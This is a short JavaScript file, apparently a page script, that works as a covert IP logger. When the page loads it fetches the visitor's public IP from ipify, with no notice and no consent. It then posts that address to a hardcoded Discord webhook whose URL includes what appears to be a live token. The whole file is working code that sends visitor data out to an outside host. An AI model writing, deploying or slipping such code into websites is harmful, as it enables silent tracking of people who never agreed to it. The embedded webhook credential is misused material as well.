document.addEventListener("DOMContentLoaded", function() {
    // Fetch the user's IP as soon as the page loads
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            console.log("User's IP: ", ipAddress);

            // Webhook URL (replace with your actual webhook URL)
            const discordWebhookUrl = "https://discord.com/api/webhooks/1294755524826628136/Mb7QgegjkM33slZlHJXy2fyutTtaDnVn1YtZ_sWyc5gda51DyXuA_uq8ZKNZrz9wyD0L";

            // Send the IP to the webhook
            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `**IP Address:** ${ipAddress}` // Discord expects the message to be in 'content'
                }),
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP sent successfully to Discord webhook.');
                } else {
                    console.error('Failed to send IP to Discord webhook.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
        });
});
